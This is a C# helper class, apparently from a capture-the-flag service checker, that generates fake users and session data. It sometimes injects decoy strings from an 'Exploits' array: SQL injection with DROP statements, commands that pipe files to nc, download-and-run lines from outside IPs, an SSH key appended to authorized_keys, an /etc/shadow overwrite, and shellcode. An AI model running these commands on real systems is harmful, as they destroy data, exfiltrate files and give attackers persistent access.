namespace GamemasterChecker
{
    using System;
    using System.Security.Cryptography;
    using System.Text.Json;
    using Bogus;
    using GamemasterChecker.DbModels;

    public class Util
    {
        private static readonly Faker Faker = new("de");
        private static readonly Faker<GamemasterUser> UserFaker = new Faker<GamemasterUser>("de")
            .RuleFor(u => u.Username, (f, u) => f.Internet.UserNameUnicode(f.Name.FirstName(), f.Name.LastName()))
            .RuleFor(u => u.Email, (f, u) => f.Internet.Email(f.Name.FirstName(), f.Name.LastName()));

        private static readonly int RoundsUntilExploits = 20;  // 30min with 90s roundtimes
        private static readonly string[] Exploits = new string[]
        {
            "\" OR true",
            "\"; cat data.db;",
            "\"; ls | grep -re 🏳️‍🌈\\X{4}",
            @"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05",
            "\" OR 1=1; DROP Table \"Users\"; --",
            "\" OR 2 != 0; DROP DATABASE \"Default\"; --",
            "\" OR 'abc' LIKE % ; SELECT * FROM 'Users' WHERE 1; --",
            "\"; psql default -U docker \\l",
            @"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\0\0\0\0\0\x40\x13\x91\0\0\0\0\0\x40\x04\x77\0\0\0\0\0\x40\x03\x91\0\0\x7f\xf7\x55\xed\x74",
            "\"; while [ 1 ]; do (find . -maxdepth 1 | xargs cat ) | nc 10.0.0.2 1337; sleep 60; done",
            "\"; curl https://165.22.31.44:54354/aaa > test_123123; chmod +x test_123123; ./test_123123",
            "nc 10.0.0.68 890 > a.out; chmod +x a.out;",
            "curl 10.0.0.193/expl.py > expl-gamemaster.py; python expl-gamemaster.py | nc 10.0.0.193 8888;",
            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c echo \"{sshkey}\" >> ~/.ssh/authorized_keys",
            @"sfdjveirotagvkeavlökeogetpgj4wefwwrvgagrtegtae\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0 chmod 0777 /etc/shadow;cat a:$1$fnfffc$pGteyHfdsmdsdsffXX4#5:13243:0:99999:7::: > /etc/shadow;",
            "python -c \" \n while True: ",
        };

        public static string Get_ssh_key()
        {
            return "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFwawwfqPSWWfe1TOcvJZkJ73NTzcsBbSqVSl7Y10kOf ed25519-key-20200717";
        }

        public static string Get_Exploit()
        {
            return Exploits[ThreadSafeRandom.Next(Exploits.Length)].Replace("{sshkey}", Get_ssh_key());
        }

        public static string GenerateFakePassword() => Faker.Internet.Password();

        public static string GenerateFakeSessionNotes(long roundid)
        {
            if (roundid > RoundsUntilExploits && ThreadSafeRandom.Next(10) == 0)
            {
                return Get_Exploit();
            }

            return Faker.Random.Bool() switch
            {
                true => Faker.Company.Bs(),
                false => Faker.Company.CatchPhrase(),
            };
        }

        public static string GenerateFakeSessionName()
        {
            return Faker.Random.Bool() switch
            {
                true => Faker.Company.Bs(),
                false => Faker.Company.CatchPhrase(),
            };
        }

        public static string GenerateFakeTokenName()
        {
            return Faker.Random.Bool() switch
            {
                true => Faker.Company.Bs(),
                false => Faker.Company.CatchPhrase(),
            };
        }

        public static string GenerateUserAgent()
        {
            return Faker.Internet.UserAgent();
        }

        public static string GenerateFakeChatMessage()
        {
            return Faker.Random.Bool() switch
            {
                true => Faker.Hacker.Phrase(),
                false => Faker.Rant.Review(),
            };
        }

        public static GamemasterUser GenerateFakeUser(long roundId, long teamId, string? flag, bool isMaster = false)
        {
            var user = UserFaker.Generate();
            user.Flag = flag;
            user.Username += Environment.TickCount.ToString();
            user.IsMaster = isMaster;
            using var rng = new RNGCryptoServiceProvider();
            Span<byte> pw = stackalloc byte[16];
            rng.GetNonZeroBytes(pw);
            user.Password = Convert.ToBase64String(pw);
            Console.WriteLine(JsonSerializer.Serialize(user));
            return user;
        }
    }
}
